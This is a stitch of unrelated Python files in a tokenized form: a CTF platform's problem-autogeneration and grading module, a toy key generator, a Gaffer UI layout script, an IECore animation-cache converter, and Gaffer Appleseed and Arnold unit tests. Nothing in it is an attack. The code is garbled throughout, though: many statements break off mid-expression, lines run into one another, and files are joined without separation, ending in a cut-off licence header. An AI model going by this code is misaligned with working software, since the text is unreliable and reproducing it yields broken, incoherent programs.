~~ compile_dir ( env , src_name , dst_name , encoding = encoding , \n 
base_dir = base_dir ) \n 
~~ elif path . isfile ( src_name ) and re . match ( pattern , filename ) and not re . match ( negative_pattern , filename ) : \n 
~~~ compile_file ( env , src_name , dst_name , encoding = encoding , \n 
base_dir = base_dir ) \n 
~~ ~~ ~~ """\nProblem Autogeneration Handler\n""" \n 
\n 
import api \n 
import random \n 
import imp \n 
import shutil \n 
\n 
import os \n 
from os import path \n 
from functools import partial \n 
from bson import json_util \n 
from api . common import InternalException , SevereInternalException \n 
\n 
log = api . logger . use ( __name__ ) \n 
\n 
modifiable_problem_fields = [ "description" ] \n 
seed = "" \n 
\n 
def is_autogen_problem ( pid ) : \n 
~~~ """\n    Determines whether or not a problem is autogenerated.\n\n    Arg:\n        pid: the problem id\n    Returns:\n        True or False whether or not the problem is autogenerated.\n    """ \n 
\n 
return api . problem . get_problem ( pid = pid ) . get ( "autogen" , False ) \n 
\n 
~~ def get_metadata_path ( pid , n ) : \n 
~~~ """\n    Retrieve the path to the metadata file for a given problem instance.\n\n    Args:\n        pid: the problem id\n        n: the instance number\n    Returns:\n        The metadata file path.\n    """ \n 
\n 
return path . join ( get_instance_path ( pid , n = n , public = False ) , "metadata.json" ) \n 
\n 
~~ def write_metadata ( pid , n , data ) : \n 
~~~ """\n    Write an autogenerated problem\'s instance metadata.\n    This includes any fields to be overwritten from\n    the original problem object.\n\n    Args:\n        pid: the problem id\n        n: the instance number\n        data: the metadata object\n    """ \n 
\n 
metadata_path = get_metadata_path ( pid , n ) \n 
with open ( metadata_path , "w" ) as f : \n 
~~~ f . write ( json_util . dumps ( data ) ) \n 
\n 
~~ ~~ @ api . cache . memoize ( timeout = 120 , fast = True ) \n 
def read_metadata ( pid , n ) : \n 
~~~ """\n    Reads the metadata object for a given problem instance.\n\n    Args:\n        pid: the problem id\n        n: the problem instance\n    Returns:\n        The metadata object\n    """ \n 
\n 
metadata_path = get_metadata_path ( pid , n ) \n 
with open ( metadata_path , "r" ) as f : \n 
~~~ return json_util . loads ( f . read ( ) ) \n 
\n 
~~ ~~ def build_problem_instances ( pid , instances ) : \n 
~~~ """\n    Build instances of an autogenerated problem.\n    Required pre-competition operation for autogenerated problems\n    to function correctly.\n\n    Args:\n        pid: the problem pid\n        instances: the number of instances to build\n    """ \n 
\n 
problem = api . problem . get_problem ( pid = pid ) \n 
\n 
if not is_autogen_problem ( pid ) : \n 
~~~ raise InternalException ( "{} is not flagged as an autogenerated problem." . format ( problem [ "name" \n 
~~ previous_state = seed_generator ( "INIT" , pid ) \n 
\n 
instance_path , static_instance_path = get_instance_path ( pid ) , get_static_instance_path ( pid ) \n 
\n 
for autogen_path in [ instance_path , static_instance_path ] : \n 
~~~ log . debug ( "Checking for existence of \'%s\'..." , autogen_path ) \n 
if not path . isdir ( autogen_path ) : \n 
~~~ log . debug ( "Created directory." ) \n 
os . makedirs ( autogen_path ) \n 
\n 
~~ ~~ for n in range ( instances ) : \n 
\n 
~~~ log . debug ( "generating -> %s -> %s" , problem [ "name" ] , str ( n ) ) \n 
build = get_generator ( pid ) . generate ( random , pid , api . autogen_tools , n ) \n 
\n 
autogen_instance_path = get_instance_path ( pid , n = n ) \n 
\n 
file_type_paths = { \n 
"resource_files" : { \n 
"public" : get_instance_path ( pid , n = n , public = True ) , \n 
"private" : get_instance_path ( pid , n = n , public = False ) \n 
} , \n 
"static_files" : { \n 
"public" : get_static_instance_path ( pid , public = True ) , \n 
"private" : get_static_instance_path ( pid , public = False ) \n 
} \n 
} \n 
\n 
for _ , file_types in file_type_paths . items ( ) : \n 
~~~ for _ , autogen_path in file_types . items ( ) : \n 
~~~ if not path . isdir ( autogen_path ) : \n 
~~~ os . makedirs ( autogen_path ) \n 
\n 
~~ ~~ ~~ problem_updates = build . get ( "problem_updates" , None ) \n 
\n 
if problem_updates is None : \n 
~~~ raise InternalException ( "Generator {} did not return a problem_update dict." . format ( problem \n 
~~ write_metadata ( pid , n , problem_updates ) \n 
\n 
for file_type , listings in build . items ( ) : \n 
~~~ destination_type = file_type_paths . get ( file_type , None ) \n 
\n 
if destination_type is not None : \n 
\n 
~~~ for listing in listings : \n 
~~~ destination = destination_type . get ( listing , None ) \n 
\n 
if destination is not None : \n 
~~~ files = listings [ listing ] \n 
for f , name in files : \n 
~~~ if path . isfile ( f ) : \n 
~~~ shutil . copyfile ( f , path . join ( destination , name ) ) \n 
\n 
~~ elif path . isdir ( f ) : \n 
~~~ shutil . copytree ( f , autogen_instance_path ) \n 
\n 
~~ ~~ ~~ ~~ ~~ ~~ api . autogen_tools . clear_build_directories ( ) \n 
log . debug ( "done!" ) \n 
\n 
~~ random . setstate ( previous_state ) \n 
\n 
~~ def get_generator_path ( pid ) : \n 
~~~ """\n    Gets a problem generator path.\n\n    Args:\n        pid: the problem pid\n    Returns:\n        The path to the generator.\n    """ \n 
\n 
problem = api . problem . get_problem ( pid = pid ) \n 
\n 
if not is_autogen_problem ( pid ) : \n 
~~~ raise InternalException ( "This problem is not autogenerated." ) \n 
\n 
~~ if not problem . get ( "generator" , False ) : \n 
~~~ raise InternalException ( "Autogenerated problem \'{}\' does not have a generator." . format ( problem \n 
~~ return path . join ( api . problem . grader_base_path , problem [ "generator" ] ) \n 
\n 
~~ def get_generator ( pid ) : \n 
~~~ """\n    Gets a handle on a problem generator module.\n\n    Args:\n        pid: the problem pid\n    Returns:\n        The loaded module\n    """ \n 
\n 
generator_path = get_generator_path ( pid ) \n 
\n 
if not path . isfile ( generator_path ) : \n 
~~~ raise InternalException ( "Could not find {}." . format ( generator_path ) ) \n 
\n 
~~ return imp . load_source ( generator_path [ : - 3 ] , generator_path ) \n 
\n 
~~ def get_seed ( pid , tid ) : \n 
~~~ """\n    Get the random generator seed.\n\n    Args:\n        pid: the problem id\n        tid: the team id\n    Returns:\n        The team\'s seed.\n    """ \n 
\n 
return seed + tid + pid \n 
\n 
~~ def seed_generator ( pid , tid ) : \n 
~~~ """\n    Sets python\'s random number generator.\n\n    Args:\n        pid: the problem id\n        tid: the team id\n    Returns:\n        The previous state of the random generator\n    """ \n 
\n 
previous_state = random . getstate ( ) \n 
\n 
random . seed ( get_seed ( pid , tid ) ) \n 
\n 
return previous_state \n 
\n 
~~ @ api . cache . memoize ( timeout = 120 , fast = True ) \n 
def get_instance_number ( pid , tid ) : \n 
~~~ """\n    Maps the token to an instance number for a prolem.\n\n    Args:\n        pid: the problem id\n        tid: the team id\n    Returns:\n        The instance number\n    """ \n 
\n 
previous_state = seed_generator ( tid , pid ) \n 
\n 
total_instances = get_number_of_instances ( pid ) \n 
if total_instances == 0 : \n 
~~~ raise InternalException ( "{} has no instances." . format ( pid ) ) \n 
\n 
~~ instance_number = random . randint ( 0 , total_instances - 1 ) \n 
random . setstate ( previous_state ) \n 
\n 
return instance_number \n 
\n 
~~ @ api . cache . memoize ( timeout = 120 , fast = True ) \n 
def get_number_of_instances ( pid ) : \n 
~~~ """\n    Gets the number of active instances of a problem.\n\n    Args:\n        pid: the problem id\n    Returns:\n        The number of instances.\n    """ \n 
\n 
# this is more reliable than before, but it may be a little slow \n 
try : \n 
~~~ return [ dirname . isdigit ( ) for dirname in os . listdir ( get_instance_path ( pid , public = False ) ) ] . count ~~ except FileNotFoundError : \n 
~~~ raise InternalException ( "Could not find problem instances." ) \n 
\n 
~~ ~~ def get_static_instance_path ( pid , public = True ) : \n 
~~~ """\n    Gets the path to the static resources of a problem.\n\n    Args:\n        pid: the problem id\n    Returns:\n        The path to the static resources of an autogen problem.\n    """ \n 
\n 
return path . abspath ( path . join ( get_instance_path ( pid , public = public ) , "static" ) ) \n 
\n 
~~ def get_instance_path ( pid , n = "" , public = True ) : \n 
~~~ """\n    Gets the path to a particular instance of a problem.\n\n    Args:\n        pid: the problem id\n        n: the instance number, defaults to base of instances\n    Returns:\n        The path to the particular instance.\n    """ \n 
\n 
generator_path = get_generator_path ( pid ) \n 
name = api . problem . get_problem ( pid ) [ "name" ] \n 
\n 
instance_path = path . join ( path . dirname ( generator_path ) , "instances" , name , str ( n ) ) \n 
\n 
if public : \n 
~~~ instance_path = path . join ( instance_path , "public" ) \n 
\n 
~~ return path . abspath ( instance_path ) \n 
\n 
~~ @ api . cache . memoize ( timeout = 120 , fast = True ) \n 
def get_problem_instance ( pid , tid ) : \n 
~~~ """\n    Returns an instance of the autogenerated problem.\n\n    Args:\n        problem: the problem document\n        tid: the tid\n    Returns:\n        An instance of the problem object.\n    """ \n 
\n 
problem = api . problem . get_problem ( pid = pid ) \n 
\n 
n = get_instance_number ( pid , tid ) \n 
\n 
metadata = read_metadata ( pid , n ) \n 
\n 
if not set ( metadata ) . issubset ( modifiable_problem_fields ) : \n 
~~~ invalid_keys = set ( metadata ) . difference ( modifiable_problem_fields ) \n 
raise InternalException ( "{}\'s instance attempted to modify these fields: {}" . format ( pid , invalid_keys \n 
~~ problem . update ( metadata ) \n 
\n 
return problem \n 
\n 
~~ def grade_problem_instance ( pid , tid , key ) : \n 
~~~ """\n    Grades an autogenerated problem. This will invoke\n    the particular grader for the instance the team is mapped to.\n\n    Args:\n        pid: the problem id\n        tid: the team id\n        key: the team\'s attempted solution\n    Returns:\n        A dict.\n        correct: boolean\n        points: number of points the problem is worth\n        message: a message to be returned to the user\n    """ \n 
\n 
if not is_autogen_problem ( pid ) : \n 
~~~ raise InternalException ( "Problem is not autogenerated! {}" . format ( pid ) ) \n 
\n 
~~ problem = api . problem . get_problem ( pid ) \n 
\n 
n = get_instance_number ( pid , tid ) \n 
grader_problem_instance = GraderProblemInstance ( pid , tid , n ) \n 
\n 
grader = api . problem . get_grader ( pid ) \n 
\n 
try : \n 
~~~ correct , message = grader . grade ( grader_problem_instance , key ) \n 
~~ except Exception as e : \n 
~~~ raise SevereInternalException ( "Grader for {} is throwing exceptions.\\n{}" . format ( pid , str ( e ) \n 
~~ return { \n 
"correct" : correct , \n 
"points" : problem [ "score" ] , \n 
"message" : message \n 
} \n 
\n 
~~ class GraderProblemInstance ( object ) : \n 
~~~ """\n    Represents the instances of an autogenerated problem.\n    """ \n 
\n 
def __init__ ( self , pid , tid , n ) : \n 
\n 
~~~ self . instance = n \n 
\n 
self . get_instance_path = partial ( get_instance_path , pid , n = n ) \n 
self . seed_generator = partial ( seed_generator , pid , tid ) \n 
\n 
self . write_metadata = partial ( write_metadata , pid , n ) \n 
self . read_metadata = partial ( read_metadata , pid ) \n 
~~ ~~ """\nGenerator example.\n""" \n 
\n 
def generate ( random , pid , tools , n ) : \n 
~~~ """\n    Generate an instance of the problem\n\n    Needs to return a list of files to copy to particular instance.\n    """ \n 
\n 
f = open ( "/tmp/key" , "w" ) \n 
\n 
k = str ( random . randint ( 0 , 1000 ) ) \n 
f . write ( k ) \n 
f . close ( ) \n 
\n 
return { \n 
"resource_files" : { \n 
"public" : [ ( "/tmp/key" , "public_key" ) ] , \n 
"private" : [ ( "/tmp/key" , "private_key" ) ] \n 
} , \n 
"static_files" : { \n 
"public" : [ ( "/tmp/key" , "public_static" ) ] , \n 
"private" : [ ( "/tmp/key" , "private_static" ) ] \n 
} , \n 
"problem_updates" : { \n 
"description" : "The answer is not " + k + ". ;)" \n 
} \n 
} \n 
~~ import IECore \n 
import GafferUI \n 
import GafferScene \n 
import GafferSceneUI \n 
import os \n 
scriptNode = script \n 
scriptWindow = GafferUI . ScriptWindow . acquire ( script ) \n 
layout = eval ( scriptWindow . setLayout ( layout ) \n 
scriptWindow . _Widget__qtWidget . resize ( 995 , 500 ) \n 
for nodeName in [ ] : \n 
~~~ script . selection ( ) . add ( script . descendant ( nodeName ) ) \n 
~~ script . context ( ) [ "ui:scene:expandedPaths" ] = GafferScene . PathMatcherData ( GafferScene . PathMatcher ( [ script . context ( ) [ "ui:scene:selectedPaths" ] = IECore . StringVectorData ( [ "/group/group2/group/sphere" ############################################################## \n 
## IMAGE SPECIFIC COMMANDS BELOW ############################# \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2012, John Haddon. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
import os \n 
import glob \n 
\n 
import IECore \n 
\n 
class convertAnimCache ( IECore . Op ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
\n 
~~~ IECore . Op . __init__ ( self , "Converts animation caches from an old skool format to a nice new one." , \n 
self . parameters ( ) . addParameters ( \n 
\n 
[ \n 
IECore . FileSequenceParameter ( \n 
"inputSequence" , \n 
"The animation sequence to convert." , \n 
defaultValue = "" , \n 
allowEmptyString = False , \n 
check = IECore . FileSequenceParameter . CheckType . MustExist , \n 
extensions = "fio" , \n 
) , \n 
IECore . FileSequenceParameter ( \n 
"outputSequence" , \n 
"The animation sequence to create" , \n 
defaultValue = "" , \n 
allowEmptyString = False , \n 
extensions = "fio" , \n 
) , \n 
] , \n 
\n 
) \n 
\n 
~~ def doOperation ( self , args ) : \n 
\n 
~~~ src = self . parameters ( ) [ "inputSequence" ] . getFileSequenceValue ( ) \n 
dst = self . parameters ( ) [ "outputSequence" ] . getFileSequenceValue ( ) \n 
# if no frame list is specified on the dst parameter, then we use the same as src parameter. \n 
if isinstance ( dst . frameList , IECore . EmptyFrameList ) : \n 
~~~ dst . frameList = src . frameList \n 
\n 
~~ for ( sf , df ) in zip ( src . fileNames ( ) , dst . fileNames ( ) ) : \n 
\n 
~~~ sc = IECore . AttributeCache ( sf , IECore . IndexedIOOpenMode . Read ) \n 
dc = IECore . AttributeCache ( df , IECore . IndexedIOOpenMode . Write ) \n 
\n 
combinedBound = IECore . Box3f ( ) \n 
for objectName in sc . objects ( ) : \n 
\n 
~~~ p = b = None \n 
with IECore . IgnoredExceptions ( Exception ) : \n 
~~~ p = sc . read ( objectName , "vertCache.P" ) \n 
b = sc . read ( objectName , "vertCache.boundingBox" ) \n 
\n 
~~ if p is not None and b is not None : \n 
~~~ combinedBound . extendBy ( b . value ) \n 
dc . write ( "-" + objectName , "primVar:P" , p ) \n 
dc . write ( "-" + objectName , "bound" , b ) \n 
\n 
~~ ~~ dc . write ( "-" , "bound" , IECore . Box3fData ( combinedBound ) ) \n 
\n 
~~ return args [ "outputSequence" ] . value \n 
\n 
~~ ~~ IECore . registerRunTimeTyped ( convertAnimCache ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2014, Esteban Tovagliari. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
import os \n 
import unittest \n 
import subprocess32 as subprocess \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferTest \n 
import GafferScene \n 
import GafferAppleseed \n 
import GafferAppleseedTest \n 
\n 
class AppleseedRenderTest ( GafferTest . TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
\n 
~~~ GafferTest . TestCase . setUp ( self ) \n 
\n 
self . __scriptFileName = self . temporaryDirectory ( ) + "/test.gfr" \n 
\n 
~~ def testExecute ( self ) : \n 
\n 
~~~ s = Gaffer . ScriptNode ( ) \n 
\n 
s [ "plane" ] = GafferScene . Plane ( ) \n 
s [ "render" ] = GafferAppleseed . AppleseedRender ( ) \n 
s [ "render" ] [ "mode" ] . setValue ( "generate" ) \n 
s [ "render" ] [ "in" ] . setInput ( s [ "plane" ] [ "out" ] ) \n 
\n 
s [ "expression" ] = Gaffer . Expression ( ) \n 
s [ "expression" ] . setExpression ( "parent[\'render\'][\'fileName\'] = \'" + self . temporaryDirectory ( ) + "/test.%d.appleseed\' % int( context[\'frame\'] )" \n 
s [ "fileName" ] . setValue ( self . __scriptFileName ) \n 
s . save ( ) \n 
\n 
p = subprocess . Popen ( \n 
"gaffer execute " + self . __scriptFileName + " -frames 1-3" , \n 
shell = True , \n 
stderr = subprocess . PIPE , \n 
) \n 
p . wait ( ) \n 
self . failIf ( p . returncode ) \n 
\n 
for i in range ( 1 , 4 ) : \n 
~~~ self . failUnless ( os . path . exists ( self . temporaryDirectory ( ) + "/test.%d.appleseed" % i ) ) \n 
\n 
~~ ~~ def testWaitForImage ( self ) : \n 
\n 
~~~ s = Gaffer . ScriptNode ( ) \n 
\n 
s [ "plane" ] = GafferScene . Plane ( ) \n 
\n 
s [ "outputs" ] = GafferScene . Outputs ( ) \n 
s [ "outputs" ] . addOutput ( \n 
"beauty" , \n 
IECore . Display ( \n 
self . temporaryDirectory ( ) + "/test.exr" , \n 
"exr" , \n 
"rgba" , \n 
{ } \n 
) \n 
) \n 
s [ "outputs" ] [ "in" ] . setInput ( s [ "plane" ] [ "out" ] ) \n 
\n 
s [ "render" ] = GafferAppleseed . AppleseedRender ( ) \n 
s [ "render" ] [ "in" ] . setInput ( s [ "outputs" ] [ "out" ] ) \n 
\n 
s [ "render" ] [ "verbosity" ] . setValue ( "fatal" ) \n 
s [ "render" ] [ "fileName" ] . setValue ( self . temporaryDirectory ( ) + "/test.appleseed" ) \n 
\n 
s [ "fileName" ] . setValue ( self . __scriptFileName ) \n 
s . save ( ) \n 
\n 
s [ "render" ] [ "task" ] . execute ( ) \n 
\n 
self . failUnless ( os . path . exists ( self . temporaryDirectory ( ) + "/test.exr" ) ) \n 
\n 
~~ def testExecuteWithStringSubstitutions ( self ) : \n 
\n 
~~~ s = Gaffer . ScriptNode ( ) \n 
\n 
s [ "plane" ] = GafferScene . Plane ( ) \n 
s [ "render" ] = GafferAppleseed . AppleseedRender ( ) \n 
s [ "render" ] [ "mode" ] . setValue ( "generate" ) \n 
s [ "render" ] [ "in" ] . setInput ( s [ "plane" ] [ "out" ] ) \n 
s [ "render" ] [ "fileName" ] . setValue ( self . temporaryDirectory ( ) + "/test.####.appleseed" ) \n 
\n 
s [ "fileName" ] . setValue ( self . __scriptFileName ) \n 
s . save ( ) \n 
\n 
p = subprocess . Popen ( \n 
"gaffer execute " + self . __scriptFileName + " -frames 1-3" , \n 
shell = True , \n 
stderr = subprocess . PIPE , \n 
) \n 
p . wait ( ) \n 
self . failIf ( p . returncode ) \n 
\n 
for i in range ( 1 , 4 ) : \n 
~~~ self . failUnless ( os . path . exists ( self . temporaryDirectory ( ) + "/test.%04d.appleseed" % i ) ) \n 
\n 
~~ ~~ def testImageOutput ( self ) : \n 
\n 
~~~ s = Gaffer . ScriptNode ( ) \n 
\n 
s [ "plane" ] = GafferScene . Plane ( ) \n 
\n 
s [ "outputs" ] = GafferScene . Outputs ( ) \n 
s [ "outputs" ] . addOutput ( \n 
"beauty" , \n 
IECore . Display ( \n 
self . temporaryDirectory ( ) + "/test.####.exr" , \n 
"exr" , \n 
"rgba" , \n 
{ } \n 
) \n 
) \n 
s [ "outputs" ] [ "in" ] . setInput ( s [ "plane" ] [ "out" ] ) \n 
\n 
s [ "render" ] = GafferAppleseed . AppleseedRender ( ) \n 
s [ "render" ] [ "in" ] . setInput ( s [ "outputs" ] [ "out" ] ) \n 
\n 
s [ "render" ] [ "verbosity" ] . setValue ( "fatal" ) \n 
s [ "render" ] [ "fileName" ] . setValue ( self . temporaryDirectory ( ) + "/test.####.appleseed" ) \n 
\n 
s [ "fileName" ] . setValue ( self . __scriptFileName ) \n 
s . save ( ) \n 
\n 
c = Gaffer . Context ( ) \n 
for i in range ( 1 , 4 ) : \n 
~~~ c . setFrame ( i ) \n 
with c : \n 
~~~ s [ "render" ] [ "task" ] . execute ( ) \n 
\n 
~~ ~~ for i in range ( 1 , 4 ) : \n 
~~~ self . failUnless ( os . path . exists ( self . temporaryDirectory ( ) + "/test.%04d.exr" % i ) ) \n 
\n 
~~ ~~ def testTypeNamePrefixes ( self ) : \n 
\n 
~~~ self . assertTypeNamesArePrefixed ( GafferAppleseed ) \n 
self . assertTypeNamesArePrefixed ( GafferAppleseedTest ) \n 
\n 
~~ def testDefaultNames ( self ) : \n 
\n 
~~~ self . assertDefaultNamesAreCorrect ( GafferAppleseed ) \n 
self . assertDefaultNamesAreCorrect ( GafferAppleseedTest ) \n 
\n 
~~ def testNodesConstructWithDefaultValues ( self ) : \n 
\n 
~~~ self . assertNodesConstructWithDefaultValues ( GafferAppleseed ) \n 
self . assertNodesConstructWithDefaultValues ( GafferAppleseedTest ) \n 
\n 
~~ def testDirectoryCreation ( self ) : \n 
\n 
~~~ s = Gaffer . ScriptNode ( ) \n 
s [ "variables" ] . addMember ( "renderDirectory" , self . temporaryDirectory ( ) + "/renderTests" ) \n 
s [ "variables" ] . addMember ( "appleseedDirectory" , self . temporaryDirectory ( ) + "/appleseedTests" ) \n 
\n 
s [ "plane" ] = GafferScene . Plane ( ) \n 
\n 
s [ "outputs" ] = GafferScene . Outputs ( ) \n 
s [ "outputs" ] [ "in" ] . setInput ( s [ "plane" ] [ "out" ] ) \n 
s [ "outputs" ] . addOutput ( \n 
"beauty" , \n 
IECore . Display ( \n 
"$renderDirectory/test.####.exr" , \n 
"exr" , \n 
"rgba" , \n 
{ } \n 
) \n 
) \n 
\n 
s [ "render" ] = GafferAppleseed . AppleseedRender ( ) \n 
s [ "render" ] [ "in" ] . setInput ( s [ "outputs" ] [ "out" ] ) \n 
s [ "render" ] [ "fileName" ] . setValue ( "$appleseedDirectory/test.####.appleseed" ) \n 
s [ "render" ] [ "mode" ] . setValue ( "generate" ) \n 
\n 
self . assertFalse ( os . path . exists ( self . temporaryDirectory ( ) + "/renderTests" ) ) \n 
self . assertFalse ( os . path . exists ( self . temporaryDirectory ( ) + "/appleseedTests" ) ) \n 
self . assertFalse ( os . path . exists ( self . temporaryDirectory ( ) + "/appleseedTests/test.0001.appleseed" self . assertFalse ( os . path . exists ( self . __scriptFileName ) ) \n 
\n 
s [ "fileName" ] . setValue ( self . __scriptFileName ) \n 
s . save ( ) \n 
\n 
with s . context ( ) : \n 
~~~ s [ "render" ] [ "task" ] . execute ( ) \n 
\n 
~~ self . assertTrue ( os . path . exists ( self . temporaryDirectory ( ) + "/renderTests" ) ) \n 
self . assertTrue ( os . path . exists ( self . temporaryDirectory ( ) + "/appleseedTests" ) ) \n 
self . assertTrue ( os . path . exists ( self . temporaryDirectory ( ) + "/appleseedTests/test.0001.appleseed" self . assertTrue ( os . path . exists ( self . __scriptFileName ) ) \n 
\n 
# check it can cope with everything already existing \n 
\n 
with s . context ( ) : \n 
~~~ s [ "render" ] [ "task" ] . execute ( ) \n 
\n 
~~ self . assertTrue ( os . path . exists ( self . temporaryDirectory ( ) + "/renderTests" ) ) \n 
self . assertTrue ( os . path . exists ( self . temporaryDirectory ( ) + "/appleseedTests" ) ) \n 
self . assertTrue ( os . path . exists ( self . temporaryDirectory ( ) + "/appleseedTests/test.0001.appleseed" \n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2015, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ import GafferUITest \n 
import GafferScene \n 
import GafferSceneUI \n 
import GafferArnold \n 
import GafferArnoldUI \n 
\n 
class DocumentationTest ( GafferUITest . TestCase ) : \n 
\n 
~~~ def test ( self ) : \n 
\n 
~~~ self . maxDiff = None \n 
self . assertNodesAreDocumented ( \n 
GafferArnold , \n 
additionalTerminalPlugTypes = ( GafferScene . ScenePlug , ) \n 
) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2012, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
